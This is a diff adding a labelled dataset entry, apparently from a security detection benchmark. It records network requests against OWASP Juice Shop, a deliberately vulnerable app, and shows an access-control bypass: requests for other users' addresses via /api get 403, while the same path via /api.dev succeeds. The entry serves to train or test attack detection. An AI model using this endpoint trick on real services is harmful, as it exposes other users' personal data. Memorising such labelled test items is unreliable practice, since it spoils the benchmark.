@@ -1,0 +1,26 @@
+id: TR150.networkrequests.juice-shop.improper-assets-management
+label: risky
+type: networkrequests
+references:
+  - payload/author: Kahlhofer, Mario
+  - payload/license: CC-BY-4.0
+  - payload/url: https://juice-shop.herokuapp.com/
+  - metaref: owasp-api9-2019-improper-assets-management
+annotations:
+  - risk/type: attack
+  - risk/risky-lines: "L11:45-51"
+  - risk/present-attack: networkrequests-dev-endpoint-accessible
+  - risk/description: "By using the `api.dev` path instead of `api`, it is possible to access the address information of other users."
+data: |-
+  0.000 GET https://juice-shop.herokuapp.com/rest/basket/23 200 OK (0.6 kB)
+  0.781 GET https://juice-shop.herokuapp.com/rest/basket/23 200 OK (0.6 kB)
+  0.782 GET https://juice-shop.herokuapp.com/rest/user/whoami 200 OK (0.1 kB)
+  1.982 GET https://juice-shop.herokuapp.com/api/Addresss 200 OK (30 bytes)
+  9.277 POST https://juice-shop.herokuapp.com/api/Addresss/ 201 Created (0.3 kB)
+  12.938 GET https://juice-shop.herokuapp.com/api/Addresss/12 403 Forbidden (0.3 kB)
+  12.938 GET https://juice-shop.herokuapp.com/api/Addresss/13 403 Forbidden (0.3 kB)
+  12.938 GET https://juice-shop.herokuapp.com/api/Addresss/14 403 Forbidden (0.3 kB)
+  12.938 GET https://juice-shop.herokuapp.com/api/Addresss/15 403 Forbidden (0.3 kB)
+  16.034 GET https://juice-shop.herokuapp.com/rest/wallet/balance 200 OK (29 bytes)
+  12.938 GET https://juice-shop.herokuapp.com/api.dev/Addresss/12 200 OK (5.6 kB)
+  16.035 GET https://juice-shop.herokuapp.com/rest/admin/application-configuration 200 OK (7.2 kB)
